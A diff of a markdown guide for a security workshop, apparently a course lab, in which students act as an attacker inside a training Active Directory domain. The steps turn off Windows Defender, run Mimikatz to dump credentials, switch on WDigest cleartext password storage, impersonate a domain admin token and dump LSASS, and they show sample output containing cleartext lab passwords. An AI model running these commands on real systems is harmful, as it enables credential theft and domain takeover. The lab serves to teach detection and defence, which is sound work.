@@ -25,12 +25,13 @@ In this workshop, you will be acting as the threat actor (TA). To begin, you wil
 1. Click "Connect" at the bottom-right to initiate the RDP session
 1. When prompted, enter the Administrator user's password:
     - `Summerishere@2023!`
+    - When prompted, click "Yes" to connect to the remote host.
 
 *CONGRATS!* You are now connected into the victim environment.
 
-Again, we are pretending as though the TA, _you_ in this case, was able to connect to RDP because they obtained the Administrator account's password. This could have been obtained via brute forcing, password spraying, credential stuffing, purchasing from an initial access broker (see [for528.com/iab](https://for528.com/iab) to learn more).
+Again, we are pretending as though the TA, _you_ in this case, was able to connect to RDP because they obtained the Administrator account's password. This could have been obtained via brute forcing, password spraying, credential stuffing, purchasing from an initial access broker (see [for528.com/iab](https://for528.com/iab) to learn more), etc.
 
-Our focus is not on obtaining initial access, but rather attacks on AD once access has been obtained -- So let's keep going!!
+Our focus is not on obtaining initial access, but rather attacks on AD once access has been obtained -- _So let's get to THAT!!_
 
 ## Accessing Credentials
 
@@ -48,62 +49,104 @@ Let's access some credentials!
         1. Do _not_ use "PowerShell 7 (x64)" or double-click "PowerShell 7" on the desktop, as we do not want PS7/Core
     1. Click "Yes" on the UAC prompt
 
+1. Disable Windows Defender:
+    1. `Set-MpPreference -DisableRealtimeMonitoring 1`
+
 1. Extract Mimikatz:
     1. `cd c:\Users\Public\Desktop\LAB_FILES\assets`
     1. `expand-archive mimikatz_trunk.zip`
 
-1. Run mimikatz meow.
-   1. `cd .\mimikatz_trunk\x64\`
-   1. `.\mimikatz.exe`
+1. Run mimikatz meow:
+    1. `cd .\mimikatz_trunk\x64\`
+    1. `.\mimikatz.exe`
    
-   1. In Mimikatz terminal @ `mimikatz #`:
+1. At the Mimikatz prompt (`mimikatz #`), run the following commands:
    
-        ```
-        privilege::debug
-        log m.txt
-        sekurlsa::logonpasswords
-        sekurlsa::wdigest
-        ```
+    ```
+    privilege::debug
+    log m.txt
+    sekurlsa::logonpasswords
+    sekurlsa::wdigest
+    ```
 
-1. Launch a separate PowerShell window as admin and run:
+    Above we set our required privileges, begin logging to a new file named `m.txt` (which resides at `c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\m.txt`), list provider credentials, and then list WDigest-specific credentials.
+    
+    Let's review the contents of the Mimikatz log file!
+    
+1. Open the `m.txt` log in notepad via:
+    1. Start menu -> type `run` -> click "Run (App)" -> Enter `notepad c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\m.txt` -> Enter/Click OK
+
+    As you scroll through the log file, you may note that there are no cleartext credentials for a domain account. Let's change that :).
+
+    We are going to enable cleartext password storage for WDigest. TAs love to do this, though you can prevent this for targeted accounts by placing them in the [Protected Users Group in AD](https://for528.com/protectedusers). In this environment, that hasn't been done, so let's take advantage of the situation.
+
+1. Close Notepad
+
+1. Launch a separate PowerShell window (do not close your current Mimikatz prompt) as admin and run:
 
     ```powershell    
     reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
-    runas /user:wheel\Administrator notepad.exe
-    password: 12qwaszx!@QWASZX
+    ```
+    
+    You have just adjusted the WDigest settin to store cleartext passwords in memory. Many orgs do not prevent and/or alert on this activity, so it's a go-to for TAs such as ransomware affiliates. 
+    
+    Next, you are going to emulate a domain account running a process on the host. This emulates a real-world environment in which a help desk employee connects to the machine, a task is running via a domain account, a service is running via a domain account, etc. We will use `runas` to run `notepad.exe`, though in the real world this account may just connect remotely to run whatever process.
+
+1. In your current PS window, execute Notepad as the `WHEEL\Administrator` user:
+    1. `runas /user:wheel\Administrator notepad.exe`
+    - You will be prompted to `Enter the password for wheel\Administrator:`, at point you will enter the account's password:
+        - `12qwaszx!@QWASZX`
+
+    _Minimize the Notepad process window_ -- **DO NOT close this window**
+
+1. Back in Mimikatz, run the following command:
+    - `sekurlsa::wdigest`
+
+    Either scroll up in the Mimikatz window buffer or once again load the `m.log` file via `notepad c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\m.txt`.
+
+    You will now see a cleartext password for the `WHEEL\Administrator` account:
+    
+    ```
+    Authentication Id : 0 ; 6908489 (00000000:00696a49)
+    Session           : Interactive from 0
+    User Name         : Administrator
+    Domain            : WHEEL
+    Logon Server      : TARVALON
+    Logon Time        : 8/6/2023 6:42:52 PM
+    SID               : S-1-5-21-3772637088-1800343157-2363924200-500
+        wdigest :	
+         * Username : Administrator
+         * Domain   : WHEEL
+         * Password : 12qwaszx!@QWASZX
     ```
 
-    - Minimize the `notepad` process window. **DO NOT close this window**
-    - We're using RunAs to emulate a process being run via the `wheel\administrator` account.
-    
-1. Back in mimikatz:
-   1. `sekurlsa::logonpasswords`
-   1. `sekurlsa::wdigest`
+    Sure, we used `runas` and entered this password. We were simply emulating the fact that a domain account might be running a process on the host, which is a _very_ common situation.
 
->Yay clear text pw!
+1. Elevate your access to the domain admin account in the Mimikatz prompt via:
+    1. `token::elevate /domainadmin`
 
-8. Elevate
+    ```
+    mimikatz # token::elevate /domainadmin
+    Token Id  : 0
+    User name :
+    SID name  : WHEEL\Domain Admins
 
-`mimkatz # token::elevate /domainadmin`
-
-    - Expected output:
-        ```
-        mimikatz # token::elevate /domainadmin
-        Token Id  : 0
-        User name :
-        SID name  : WHEEL\Domain Admins
-
-        3804    {0;00e652ef} 3 D 15095083       WHEEL\Administrator     S-1-5-21-2920872554-2728211966-3144411165-500   (16g,24p)       Primary
-         -> Impersonated !
-         * Process Token : {0;006de2b6} 3 D 15016662    CLIENT01\Administrator  S-1-5-21-1871320352-3388450030-3539921296-500   (14g,24p)       Primary
-         * Thread Token  : {0;00e652ef} 3 D 15181987    WHEEL\Administrator     S-1-5-21-2920872554-2728211966-3144411165-500   (16g,24p)       Impersonation (Delegation)\
-        ```
+    5864    {0;00696a49} 3 D 7045543        WHEEL\Administrator     S-1-5-21-3772637088-1800343157-2363924200-500   (16g,24p)       Primary
+     -> Impersonated !
+     * Process Token : {0;0046d32c} 3 D 6679841     TWORIVERS\Administrator S-1-5-21-3172349730-3661535773-235960969-500    (14g,24p)       Primary
+     * Thread Token  : {0;00696a49} 3 D 7413640     WHEEL\Administrator     S-1-5-21-3772637088-1800343157-2363924200-500   (16g,24p)       Impersonation (Delegation)
+    ```
 
 **CONGRATS!! You are not elevated to a domain admin account!
 
+More importantly, you now have the cleartext password of the domain admin account, `WHEEL\Administrator`, which is `12qwaszx!@QWASZX`.
 
+## BONUS 1: LOLBIN Method
 
-## Other way lolbins
+RYAN, FILL ME OUT.
+
+BRANDON> You can detect the get-proc lsass or minidump if you'd like, but this is meant more as a bonus for students.
+
 1. in an local admin powershell:
 ```
 get-process lsass
@@ -120,7 +163,7 @@ mimikatz # sekurlsa::logonPasswords full
 
 ----
 
-## BONUS: Weak Passwords
+## BONUS 2: Weak Passwords
 
 That Administrator account password (`Summerishere@2023!`) is weak, right? You might be surprised how often this type of password is found in large-scale environments. Back in 2015/16, the Iranian-based APT33 group capitalized on the prevalence of passwords that include the season or month + year in attacks against the US energy sector. These attacks proved highly successful, yet nearly a decade later, we still see these passwords in use in organizations around the world.
 
